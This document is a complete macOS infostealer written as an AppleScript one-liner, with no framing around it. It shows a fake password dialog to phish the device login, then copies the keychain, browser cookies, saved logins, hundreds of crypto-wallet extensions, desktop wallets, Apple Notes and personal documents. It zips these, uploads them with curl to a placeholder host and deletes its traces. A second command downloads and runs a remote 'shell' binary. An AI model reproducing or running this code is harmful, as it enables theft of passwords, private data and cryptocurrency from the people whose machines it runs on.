osascript -e 'on mkdir(someItem)
try
set filePosixPath to quoted form of (POSIX path of someItem)
do shell script "mkdir -p " & filePosixPath
end try
end mkdir
on readfile(pather)
try
set theFile to POSIX file pather
set fileContents to read theFile
return fileContents
end try
return ""
end readfile
on FileName(filePath)
try
set reversedPath to (reverse of every character of filePath) as string
set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
set finalPath to (reverse of every character of trimmedPath) as string
return finalPath
end try
return ""
end FileName
on Directory(filePath)
try
set lastSlash to offset of "/" in (reverse of every character of filePath) as string
set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
return trimmedPath
end try
return ""
end Directory
on writeText(textToWrite, filePath)
try
set folderPath to Directory(filePath)
mkdir(folderPath)
set fileRef to (open for access filePath with write permission)
set eof of fileRef to 0
write textToWrite to fileRef starting at eof
close access fileRef
end try
end writeText
on readwrite(path_to_file, path_as_save)
try
set fileContent to read path_to_file
set folderPath to Directory(path_as_save)
mkdir(folderPath)
do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
end try
end readwrite
on isDir(someItem)
try
set filePosixPath to quoted form of (POSIX path of someItem)
set fileType to (do shell script "file -b " & filePosixPath)
if fileType ends with "directory" then
return true
end if
end try
return false
end isDir
on GrabFolder(sourceFolder, destinationFolder)
try
set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "GPUCache", "DawnCache", "Crashpad", "DawnWebGPUCache", "DawnGraphiteCache", "__update__", "tor"}
set fileList to list folder sourceFolder without invisibles
mkdir(destinationFolder)
repeat with currentItem in fileList
if currentItem is not in exceptionsList then
set itemPath to sourceFolder & "/" & currentItem
set savePath to destinationFolder & "/" & currentItem
if isDir(itemPath) then
GrabFolder(itemPath, savePath)
else
readwrite(itemPath, savePath)
end if
end if
end repeat
end try
end GrabFolder
on GetUUID(pather, searchString)
try
set theFile to POSIX file pather
set fileContents to read theFile
set startPos to offset of searchString in fileContents
if startPos is 0 then
return "not found"
end if
set uuidStart to startPos + (length of searchString)
set rawuuid to text uuidStart thru (uuidStart + 55) of fileContents
set endpos to offset of "\\" in rawuuid
if endpos is 0 then
return "not found"
end if
set realuuid to text uuidStart thru (uuidStart + endpos - 2) of fileContents
return realuuid
on error
return "not found"
end try
end GetUUID
on firewallets(firepath, savePath)
try
set fire_wallets to {{"MetaMask", "webextension@metamask.io\\\":\\\""}, {"BNB_Chain_Wallet", "0a395005-c941-4030-83c9-018ee43e3414}\\\":\\\""}}
repeat with fire_wallet in fire_wallets
set uuid to GetUUID(firepath & "/prefs.js", item 2 of fire_wallet)
if uuid is not "not found" then
set walkpath to firepath & "/storage/default/"
set fileList to list folder walkpath without invisibles
repeat with currentItem in fileList
if (currentItem contains uuid) and (currentItem contains "userContext") then
set fwallet to walkpath & currentItem & "/idb/"
set walletFiles to list folder fwallet without invisibles
repeat with currentWallet in walletFiles
if isDir(fwallet & currentWallet) then
GrabFolder(fwallet & currentWallet, savePath & "/" & item 1 of fire_wallet & "/")
end if
end repeat
end if
end repeat
end if
end repeat
end try
end firewallets
on parseFF(browsername, firefox, writemind)
try
set myFiles to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json"}
set fileList to list folder firefox without invisibles
repeat with currentItem in fileList
set brPrName to browsername & "_" & currentItem
set savePath to writemind & "Brs/" & brPrName
set extSavePath to writemind & "Exts/" & brPrName
firewallets(firefox & currentItem, extSavePath)
set readpath to firefox & currentItem
repeat with FFile in myFiles
readwrite(readpath & FFile, savePath & FFile)
end repeat
end repeat
end try
end parseFF
on checkvalid(username, password_entered)
try
set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
if result is not equal to "" then
return false
else
return true
end if
on error
return false
end try
end checkvalid
on getpwd(username, writemind)
try
if checkvalid(username, "") then
set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
writeText(result as string, writemind & "masterpass-chrome")
else
repeat
set result to display dialog "Required Application Helper. Please enter device password to continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "Application wants to install helper" with hidden answer
set password_entered to text returned of result
if checkvalid(username, password_entered) then
return password_entered
end if
end repeat
end if
end try
return ""
end getpwd
on grabPlugins(paths, savePath, pluginList, index)
try
set fileList to list folder paths without invisibles
repeat with PFile in fileList
repeat with currentPlugin in pluginList
if (PFile contains currentPlugin) then
set newpath to paths & PFile
set newsavepath to savePath & "/" & currentPlugin
if index then
set newsavepath to newsavepath & "/IndexedDB/"
end if
GrabFolder(newpath, newsavepath)
end if
end repeat
end repeat
end try
end grabPlugins
on chromium(writemind, chromium_map)
set pluginList to {"ldinpeekobnhjjdofggfgjlcehhmanlj", "nphplpgoakhhjchkkhmiggakijnkhfnd", "jbkgjmpfammbgejcpedggoefddacbdia", "fccgmnglbhajioalokbcidhcaikhlcpm", "nebnhfamliijlghikdgcigoebonmoibm", "fdcnegogpncmfejlfnffnofpngdiejii", "mfhbebgoclkghebffdldpobeajmbecfk", "ffbceckpkpbcmgiaehlloocglmijnpmp", "kfdniefadaanbjodldohaedphafoffoh", "bedogdpgdnifilpgeianmmdabklhfkcn", "kpfchfdkjhcoekhdldggegebfakaaiog", "klnaejjgbibmhlephnhpmaofohgkpgkd", "opcgpfmipidbgpenhmajoajpbobppdil", "mmmjbcfofconkannjonfmjjajpllddbg", "modjfdjcodmehnpccdjngmdfajggaoeh", "dkdedlpgdmmkkfjabffeganieamfklkm", "ifclboecfhkjbpmhgehodcjpciihhmif", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ejjladinnckdgjemekebdpeokbikhfci", "kkpllkodjeloidieedojogacfhpaihoh", "apnehcjmnengpnmccpaibjmhhoadaico", "jiepnaheligkibgcjgjepjfppgbcghmp", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "idpdilbfamoopcfofbipefhmmnflljfi", "lbjapbcmmceacocpimbpbidpgmlmoaao", "oiohdnannmknmdlddkdejbmplhbdcbee", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ilhaljfiglknggcoegeknjghdgampffk", "pfccjkejcgoppjnllalolplgogenfojk", "cnmamaachppnkjgnildpdmkaakejnhae", "eajafomhmkipbjmfmhebemolkcicgfmd", "emeeapjkbcbpbpgaagfchmcgglmebnen", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "hifafgmccdpekplomjjkcfgodnhcellj", "ffnbelfdoeiohenkjibnmadjiehjhajb", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bcopgchhojmggmffilplmbdicgaihlkp", "cmoakldedjfnjofgbbfenefcagmedlga", "ifckdpamphokdglkkdomedpdegcjhjdp", "ibljocddagjghmlpgihahamcghfggcjc", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "kbdcddcmgoplfockflacnnefaehaiocb", "cgeeodpfagjceefieflmdfphplkenlfk", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "fdchdcpieegfofnofhgdombfckhbcokj", "gjlmehlldlphhljhpnlddaodbjjcchai", "ellkdbaphhldpeajbepobaecooaoafpg", "ojbcfhjmpigfobfclfflafhblgemeidi", "ghlmndacnhlaekppcllcpcjjjomjkjpg", "kgdijkcfiglijhaglibaidbipiejjfdp", "abkahkcbhngaebpcgfmhkoioedceoigp", "ammjlinfekkoockogfhdkgcohjlbhmff", "pdliaogehgdbhbnmkklieghmmjkpigpa", "jnlgamecbpmbajjfhmmmlhejkemejdma", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "jfdlamikmbghhapbgfoogdffldioobgl", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "hgbeiipamcgbdjhfflifkgehomnmglgk", "pmmnimefaichbcnbndcfpaagbepnjaig", "cflgahhmjlmnjbikhakapcfkpbcmllam", "keenhcnmdmjjhincpilijphpiohdppno", "bipdhagncpgaccgdbddmbpcabgjikfkn", "bcenedbpaaegpnijoadpdjiachahncdg", "pocmplpaccanhmnllbbkpgfliimjljgo", "klghhnkeealcohjjanjjdaeeggmfmlpl", "cjookpbkjnpkmknedggeecikaponcalb", "ojggmchlghnjlapmfbnjholfjkiidbch", "dngmlblcodfobpdpecaadgfbcggfjfnm", "jnldfbidonfeldmalbflbmlebbipcnle", "ehjiblpccbknkgimiflboggcffmpphhp", "agoakfejjabomempkjlepdflaleeobhb", "fopmedgnkfpebgllppeddmmochcookhc", "dmkamcknogkgcdfhhbddcghachkejeap", "iglbgmakmggfkoidiagnhknlndljlolb", "opfgelmcmbiajamepnmloijbpoleiama", "gkeelndblnomfmjnophbhfhcjbcnemka", "dgiehkgfknklegdhekgeabnhgfjhbajd", "gafhhkghbfjjkeiendhlofajokpaflmk", "imlcamfeniaidioeflifonfjeeppblda", "penjlddjkjgpnkllboccdgccekpkcbin", "nhnkbkgjikgcigadomkphalanndcapjk", "egjidjbpglichdcondbcbdnbeeppgdph", "dlcobpjiigpikoobohmabehhmhfoodbb", "dldjpboieedgcmpkchcjcbijingjcgok", "acmacodkjbdgmoleebolmdjonilkdbch", "lccbohhgfkdikahanoclbdmaolidjdfl", "pcndjhkinnkaohffealmlmhaepkpmgkb", "gjagmgiddbbciopjhllkdnddhcglnemk", "cnncmdhjacpkmjmkcafchppbnpnhdmon", "mfgccjchihfkkindfppnaooecgfneiii", "ieldiilncjhfkalnemgjbffmpomcaigi", "ckklhkaabbmdjkahiaaplikpdddkenic", "loinekcabhlmhjjbocijdoimmejangoa", "mgffkfbidihjpoaomajlbgchddlicgpn", "pnndplcbkakcplkjnolgbkdgjikjednm", "mcohilncbfahbmgdjkbpemcciiolgcge", "bgpipimickeadkjlklgciifhnalhdjhe", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "jiidiaalihmmhddjgbnbgdfflelocpak", "aeachknmefphepccionboohckonoeemg", "gdokollfhmnbfckbobkdbakhilldkhcj", "jiiigigdinhhgjflhljdkcelcjfmplnd", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "jaooiolkmfcmloonphpiiogkfckgciom", "fcckkdbjnoikooededlapcalpionmalo", "mdnaglckomeedfbogeajfajofmfgpoae", "ebfidpplhabeedpnhjnobghokpiioolj", "dbgnhckhnppddckangcjbkjnlddbjkna", "cpmkedoipcpimgecpmgpldfpohjplkpp", "epapihdplajcdnnkdeiahlgigofloibg", "iokeahhehimjnekafflcihljlcjccdbe", "cihmoadaighcejopammfbmddcmdekcje", "hnfanknocfeofbddgcijnmhnfnkdnaad", "kilnpioakcdndlodeeceffgjdpojajlo", "abogmiocnneedmmepnohnhlijcjpcifd", "bofddndhbegljegmpmnlbhcejofmjgbn", "aholpfdialjgjfhomihkjbmgjidlcdno", "hdkobeeifhdplocklknbnejdelgagbao", "oafedfoadhdjjcipmcbecikgokpaphjk", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "nkbihfbeogaeaoehlefnkodbefgpgknn", "lfmmjkfllhmfmkcobchabopkcefjkoip", "aiifbnbfobpmeekipheeijimdpnlpgpp", "anokgmphncpekkhclmingpimjmcooifb", "mnfifefkajgofkcjkemidiaecocnkjeh", "momakdpclmaphlamgjcndbgfckjfpemp", "akkmagafhjjjjclaejjomkeccmjhdkpa", "ehgjhhccekdedpbkifaojjaefeohnoea", "mkpegjkblkkefacfnmkajcjmabijhclg", "mlhakagmgkmonhdonhkpjeebfphligng", "niiaamnmgebpeejeemoifgdndgeaekhe", "jnmbobjmhlngoefaiojfljckilhhlhcj", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kppfdiipphfccemcignhifpjkapfbihd", "hcjhpkgbmechpabifbggldplacolbkoh", "flpiciilemghbmfalicajoolhkkenfel", "mlbnicldlpdimbjdcncnklfempedeipj", "cfbfdhimifdmdehjmkdobpcjfefblkjm", "ocjobpilfplciaddcbafabcegbilnbnb", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "enabgbdfcbaehmbigakijjabdpdnimlg", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "fcfcfllfndlomdhbehjjcoimbgofdncg", "lpilbniiabackdjcionkobglmddfbcjo", "efbglgofoippbgcjepnhiblaibcnclgk", "fhbohimaelbohpjbbldcngcnapndodjp", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "bocpokimicclpaiekenaeelehdjllofo", "bhhhlbepdkbapadjdnnojkbgioiodbic", "aflkmfhebedbjioipglgcbcmnbpgliof", "mkchoaaiifodcflmbaphdgeidocajadp", "mapbhaebnddapnmifbbkgeedkeplgjmf", "lmkncnlpeipongihbffpljgehamdebgi", "gjnckgkfmgmibbkoficdidcljeaaaheg", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "kamfleanhcmjelnhaeljonilnmjpkcjc", "cphhlgmgameodnhkjdmkpanlelnlohao", "hnhobjmcibchnmglfbldbfabcgaknlkj", "nknhiehlklippafakaeklbeglecifhad", "kjjebdkfeagdoogagbhepmbimaphnfln", "phkbamefinggmakgklpkljjmgibohnba", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "mdjmfdffdcmnoblignmgpommbefadffd", "jblndlipeogpafnldhgmapagcccfchpi", "hbbgbephgojikajhfbomhlmmollphcad", "dpcklmdombjcplafheapiblogdlgjjlb", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "kmhcihpebfmpgmihbkipmjlmmioameka", "kennjipeijpeengjlogfdjkiiadhbmjl", "amkmjjmmflddogmhpjloimipbofnfjih", "idnnbdplmphpflfnlkomgpfbpcgelopg", "fmblappgoiilbgafhjklehhfifbdocee", "heamnjbnflcikcggoiplibfommfbkjpj", "khpkpbbcccdmmclmpigdgddabeilkdpd", "omaabbefbmiijedngplfjmnooppbclkk", "nhlnehondigmgckngjomcpcefcdplmgc", "fiikommddbeccaoicoejoniammnalkfa", "ejbidfepgijlcgahbmbckmnaljagjoll", "glmhbknppefdmpemdmjnjlinpbclokhn", "kncchdigobghenbbaddojjnnaogfppfj", "hpclkefagolihohboafpheddmmgdffjm", "ilolmnhjbbggkmopnemiphomhaojndmb", "panpgppehdchfphcigocleabcmcgfoca", "nngceckbapebfimnlniiiahkandclblb", "hdokiejnpimakedhajhdlcegeplioahd", "eiaeiblijfjekdanodkjadfinkhbfgcd", "bfogiafebfohielmmehodmfbbebbbpei", "pnlccmojcmeohlpggmfnbbiapkmbliob", "aeblfdkhhhdcdjpifhhbdiojplfjncoa", "kmcfomidfpdkfieipokbalgegidffkal", "fdjamakpfbbddfjaooikfcpapjohcfmg", "ghmbeldphafepmbegfdlkpapadhbakde", "cnlhokffphohmfcddnibpohmkdfafdli", "khhapgacijodhjokkcjmleaempmchlem", "admmjipmmciaobhojoghlmleefbicajg", "caljgklbbfbcjjanaijlacgncafpegll"}
set indexedPlugins to {"hnfanknocfeofbddgcijnmhnfnkdnaad", "mcohilncbfahbmgdjkbpemcciiolgcge", "aflkmfhebedbjioipglgcbcmnbpgliof", "enabgbdfcbaehmbigakijjabdpdnimlg", "cpmkedoipcpimgecpmgpldfpohjplkpp", "hdokiejnpimakedhajhdlcegeplioahd", "eiaeiblijfjekdanodkjadfinkhbfgcd", "cnlhokffphohmfcddnibpohmkdfafdli", "khhapgacijodhjokkcjmleaempmchlem", "hifafgmccdpekplomjjkcfgodnhcellj"}
set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
repeat with chromiumBrowser in chromium_map
set brPrName to item 1 of chromiumBrowser & "_"
set savePath to writemind & "Brs/" & brPrName
set extSavePath to writemind & "Exts/" & brPrName
 
try
set fileList to list folder item 2 of chromiumBrowser without invisibles
repeat with currentItem in fileList
if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
repeat with CFile in chromiumFiles
set readpath to (item 2 of chromiumBrowser & currentItem & CFile)
if ((CFile as string) is equal to "/Network/Cookies") then
set CFile to "/Cookies"
end if
if ((CFile as string) is equal to "/Local Extension Settings/") then
grabPlugins(readpath, extSavePath & currentItem, pluginList, false)
else if (CFile as string) is equal to "/IndexedDB/" then
grabPlugins(readpath, extSavePath & currentItem, indexedPlugins, true)
else
set writepath to savePath & currentItem & CFile
readwrite(readpath, writepath)
end if
end repeat
end if
end repeat
end try
end repeat
end chromium
on filegrabber(writemind)
try
set destFolder to writemind & "Files/"
set ntsP to writemind & "Notes/"
set destinationFolderPath to POSIX file destFolder
set ntsPDF to POSIX file ntsP
set notesMediaFolder to POSIX file (ntsP & "Media/")
set extensionsList to {"txt", "pdf", "docx", "wallet", "key", "keys", "doc", "jpeg", "png", "kdbx", "rtf", "jpg"}
set bankSize to 0
set notesBankSize to 0
set uuidString to do shell script "system_profiler SPHardwareDataType | awk \"/UUID/ { print $3 }\""
mkdir(destinationFolderPath)
mkdir(notesMediaFolder)
tell application "Finder"
try
set safariFolderPath to (path to home folder as text) & "Library:Cookies:"
duplicate file (safariFolderPath & "Cookies.binarycookies") to folder destinationFolderPath with replacing
set name of result to "saf1"
end try
set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
try
duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
end try
set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
try
set notesFolder to folder notesFolderPath
set notesFiles to {"NoteStore.sqlite", "NoteStore.sqlite-shm", "NoteStore.sqlite-wal"}
repeat with aFile in notesFiles
try
duplicate (file aFile of notesFolder) to folder ntsPDF with replacing
end try
end repeat
end try
set notesAccountsPath to (notesFolderPath & "Accounts:")
try
set notesAccountsFolder to folder notesAccountsPath
set notesAccountsFiles to every folder of notesAccountsFolder
repeat with nFile in notesAccountsFiles
set notesMediaPath to notesAccountsPath & name of nFile & ":Media:"
set notesMediaAllProfiles to every folder of (folder notesMediaPath)
repeat with profileFolder in notesMediaAllProfiles
set notesMediaProfilesPath to notesMediaPath & name of profileFolder
set notesMediaProfileFiles to every folder of (folder notesMediaProfilesPath)
repeat with notesUUID in notesMediaProfileFiles
set noteIdFiles to every file of notesUUID
repeat with notesIdFile in noteIdFiles
try
set fileSize to size of notesIdFile as text
set notesBankSize to notesBankSize + fileSize
if notesBankSize < 12 * 1024 * 1024 then
duplicate notesIdFile to notesMediaFolder with replacing
else
exit repeat
end if
end try
end repeat
end repeat
end repeat
end repeat
end try
try
set safariFolderPath to (path to library folder from user domain as text) & "Safari:"
duplicate (file "Form Values" of folder safariFolderPath) to destinationFolderPath with replacing
end try
try
set keychainFolder to (path to library folder from user domain as text) & "Keychains:" & uuidString
duplicate folder keychainFolder to destinationFolderPath with replacing
end try
try
set desktopFiles to every file of desktop
set documentsFiles to every file of folder "Documents" of (path to home folder)
repeat with aFile in (desktopFiles & documentsFiles)
set fileExtension to name extension of aFile
if fileExtension is in extensionsList then
set fileSize to size of aFile
if (bankSize + fileSize) < 10 * 1024 * 1024 then
try
duplicate aFile to folder destinationFolderPath with replacing
set bankSize to bankSize + fileSize
end try
else
exit repeat
end if
end if
end repeat
end try
end tell
end try
end filegrabber
on send_data(attempt, outUsername, serverIP, isBot)
try
set result_send to (do shell script "curl -X POST -H \"X-Bid: " & "f48fbe39836779cadbf148b5952919fd" & "\" -F \"lil-arch=@/tmp/salmonela.zip\" https://fake-domain.com/api/data/receive")
on error
if attempt < 10 then
delay 60
send_data(attempt + 1, outUsername, serverIP)
end if
end try
end send_data
 
on snd_rn(attempt)
try
set result_send to (do shell script "curl -X POST -H \"X-Bid: f48fbe39836779cadbf148b5952919fd\" https://fake-domain.com/api/health")
on error
if attempt < 2 then
delay 10
snd_rn(attempt + 1, outUsername, serverIP)
end if
end try
end snd_rn
 
on main()
snd_rn(0)
set username to (system attribute "USER")
set outUsername to "a"
set serverIP to "localhost"
set isBot to ""
set systemProfile to "/Users/" & username
writeText(outUsername, systemProfile & "/.username")
set writemind to "/tmp/salmonela/"
try
set result_userinfo to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
writeText(result_userinfo, writemind & "hardware")
end try
set rawlib to systemProfile & "/Library/"
set library to rawlib & "Application Support/"
set password_entered to readfile(systemProfile & "/.pwd")
if not checkvalid(username, password_entered) then
set password_entered to getpwd(username, writemind)
writeText(password_entered, systemProfile & "/.pwd")
end if
delay 0.01
writeText(password_entered, writemind & "ggwp")
 
set noteStorePath to rawlib & "Group Containers/group.com.apple.notes/NoteStore.sqlite"
readwrite(rawlib, writemind & "Notes/NoteStore.sqlite")
readwrite(rawlib & "-wal", writemind & "Notes/NoteStore.sqlite-wal")
readwrite(rawlib & "-shm", writemind & "Notes/NoteStore.sqlite-shm")
readwrite(rawlib & "Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "Files/Cookies.binarycookies")
readwrite(rawlib & "Cookies/Cookies.binarycookies", writemind & "Files/saf1")
 
filegrabber(writemind)
 
set chromiumMap to {{"chr", library & "Google/Chrome/"}, {"brave", library & "BraveSoftware/Brave-Browser/"}, {"edge", library & "Microsoft Edge/"}, {"viva", library & "Vivaldi/"}, {"op", library & "com.operasoftware.Opera/"}, {"opgx", library & "com.operasoftware.OperaGX/"}, {"chr_b", library & "Google/Chrome Beta/"}, {"chr_c", library & "Google/Chrome Canary"}, {"chrm", library & "Chromium/"}, {"chr_dev", library & "Google/Chrome Dev/"}, {"arc", library & "Arc/User Data/"}}
 
set walletMap to {{"Electrum", systemProfile & "/.electrum/wallets/"}, {"Coinomi", library & "Coinomi/wallets/"}, {"Exodus", library & "Exodus/"}, {"Atomic", library & "atomic/Local Storage/leveldb/"}, {"Wasabi", systemProfile & "/.walletwasabi/client/Wallets/"}, {"Ledger_Live", library & "Ledger Live/"}, {"Monero", systemProfile & "/Monero/wallets/"}, {"Bitcoin_Core", library & "Bitcoin/wallets/"}, {"Litecoin_Core", library & "Litecoin/wallets/"}, {"Dash_Core", library & "DashCore/wallets/"}, {"Electrum_LTC", systemProfile & "/.electrum-ltc/wallets/"}, {"Electron_Cash", systemProfile & "/.electron-cash/wallets/"}, {"Guarda", library & "Guarda/"}, {"Dogecoin_Core", library & "Dogecoin/wallets/"}, {"Trezor_Suite", library & "@trezor/suite-desktop/"}}
readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
readwrite(rawlib & "Keychains/login.keychain-db", writemind & "Kch/login.keychain-db")
 
writeText(username, writemind & "user")
set ff_paths to {{"ff", library & "Firefox/Profiles/"}, {"wf", library & "Waterfox/Profiles/"}}
repeat with gecko in ff_paths
try
parseFF(item 1 of gecko, item 2 of gecko, writemind)
end try
end repeat
 
repeat with deskWallet in walletMap
GrabFolder(item 2 of deskWallet, writemind & "Wlt/" & item 1 of deskWallet)
end repeat
chromium(writemind, chromiumMap)
do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/salmonela.zip"
send_data(0, outUsername, serverIP, isBot)
do shell script "rm -r " & writemind
do shell script "rm /tmp/salmonela.zip"
end main
 
main()' & osascript -e 'try
delay 30
do shell script "cd /tmp/ && curl https://fake-domain/trovo/index.php --output SHS.zip && unzip -o SHS.zip && chmod +x shell && ./shell"
